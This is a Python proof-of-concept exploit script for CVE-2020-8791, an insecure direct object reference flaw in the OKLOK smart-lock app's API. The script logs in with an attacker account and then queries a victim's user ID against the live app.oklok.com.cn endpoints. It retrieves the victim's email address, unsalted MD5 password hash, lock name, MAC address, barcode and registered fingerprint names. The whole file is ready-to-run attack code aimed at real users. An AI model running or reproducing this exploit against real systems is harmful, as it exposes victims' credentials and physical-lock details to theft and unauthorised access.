#!/usr/bin/env python3

#PoC code for CVE-2020-8791
#Get email address, unsalted MD5 password hash, lock name, fingerprint name, etc. for OKLOK mobile app user

import requests
import json
import sys
import datetime
import getpass

#grab the attacker token to use in HTTP headers for other requests
def login_attacker(attacker_email_address, attacker_password):
        
    login_url = 'https://app.oklok.com.cn/oklock/user/loginByPassword'
    body = {"code":attacker_password,"account":attacker_email_address,"type":"0"}

    headers = {'Host': 'app.oklok.com.cn',
    'Content-Type': 'application/json',
    'Connection': 'keep-alive',
    'Accept': '*/*',
    'User-Agent': 'OKLOK/3.1.1 (iPhone; iOS 13.3; Scale/2.00)',
    'Accept-Language': 'en-US;q=1',
    'Content-Length': '70',
    'Accept-Encoding': 'gzip, deflate, br'}

    print('\n-------------------------------------------------------------')
    print('[*] Logging in...')

    
    response = requests.post(login_url, data=json.dumps(body), headers=headers)
    json_resp = response.json()
    status = json_resp['status']
    if status == '2000':
        print('[*] Login successful\n')
        print('=============================================================')
        print('ATTACKER LOGIN DETAILS:')
        print('=============================================================')
        result = json_resp['result']
        attacker_token = result['token']
        attacker_userId = result['userId']
        print('attacker_token: ' + str(attacker_token))
        print('attacker_userId: ' + str(attacker_userId))
        print('-------------------------------------------------------------\n')
        return attacker_token

    else:
        sys.exit('[*] Login not successful.')

#get user and account information
def scan_id(victim_userID, attacker_token):

    get_user_info = 'https://app.oklok.com.cn/oklock/user/getInfo'
    get_lock_info = 'https://app.oklok.com.cn/oklock/lock/getLockList'
    get_fingerprints_info = 'https://app.oklok.com.cn/oklock/lock/fingerprintList'


    body = {"userId":victim_userID}

    headers = {'Host': 'app.oklok.com.cn',
    'phoneModel': 'iPhone11,8',
    'Accept': '*/*',
    'appVersion': '3.1.1',
    'Accept-Language': 'en-US;q=1',
    'Accept-Encoding': 'gzip, deflate, br',
    'token': attacker_token,
    'Content-Type': 'application/json',
    'clientType': 'iOS',
    'language': 'en-US',
    'User-Agent': 'OKLOK/3.1.1 (iPhone; iOS 13.3; Scale/2.00)',
    'Connection': 'keep-alive',
    'osVersion': '13.3'}                

    print(f'[*] Getting user account info for {victim_userID}...')

    user_info = requests.post(get_user_info, data=json.dumps(body), headers=headers)
    lock_info = requests.post(get_lock_info, data=json.dumps(body), headers=headers)

    json_user_info = user_info.json()
    json_lock_info = lock_info.json()

    user_result = json_user_info['result']
    user_status = json_user_info['status']

    lock_result = json_lock_info['result']
    lock_status = json_lock_info['status']
    if user_status == '2000':
        if len(user_result)!=0:
            print('[*] Got user account info.\n')
            acct_creation = user_result['createAt']
            cid = user_result['cid']
            nickname = user_result['nickName']
            email_address = user_result['userId']
            password_hash = user_result['password']
            qrUrl = user_result['qrUrl']
            picUrl = user_result['picUrl']
            print('=============================================================')
            print('USER ACCOUNT INFO:')
            print('=============================================================')
            print('userID: ' + str(victim_userID))
            print('account creation: ' + str(acct_creation))
            print('cid: ' + str(cid))
            print('nickname: ' + str(nickname))
            print('email address: ' + str(email_address))
            print('password hash: ' + str(password_hash))
            print('qrUrl: ' + str(qrUrl))
            print('picUrl: ' + str(picUrl))
    else:
        print('HTTP Error - Could not retrieve user info.')

    print('\n[*] Getting lock info...')

    if lock_status == '2000':
        if len(lock_result)!=0:
            print('[*] Got lock info.\n')
            print('=============================================================')
            print('LOCK INFO:')
            print('=============================================================')
            lock_name = lock_result[0]['name']
            mac_address = lock_result[0]['mac']
            barcode = lock_result[0]['barcode']
            lockId = lock_result[0]['id']

            body_fingerprints = {"userId":victim_userID, "lockId":lockId}
            fingerprints_info = requests.post(get_fingerprints_info, data=json.dumps(body_fingerprints), headers=headers)
            json_prints_info = fingerprints_info.json()
            prints_result = json_prints_info['result']
            prints_status = json_prints_info['status']
            if prints_status == '2000':
                if len(prints_result)!=0:
                    prints_name = prints_result[0]['name']
                else:
                    prints_name = 'N/A'
            print('lock name: ' + str(lock_name))
            print('mac address: ' + str(mac_address))
            print('barcode: ' + str(barcode))
            print('lockId: ' + str(lockId))
            print('registered prints: ' + str(prints_name))

        else:
            print('[*] No lock bound.')
            print('lock name: N/A')
            print('mac address: N/A')
            print('barcode: N/A')
            print('lockId: N/A')
            print('registered prints: N/A')
    else:
        print('HTTP Error - Could not retrieve lock info')
    print('-------------------------------------------------------------\n')

def main():

    if len(sys.argv) is not 3:
        sys.exit('Usage: python3 ownklok_idor.py <victim_userID> <attacker_email_address>')
    else:
        victim_userID = int(sys.argv[1])
        attacker_email_address = sys.argv[2]
        attacker_password = getpass.getpass('Attacker Password: ')

    attacker_token = login_attacker(attacker_email_address, attacker_password)

    scan_id(victim_userID, attacker_token)


if __name__ == '__main__':
    main()
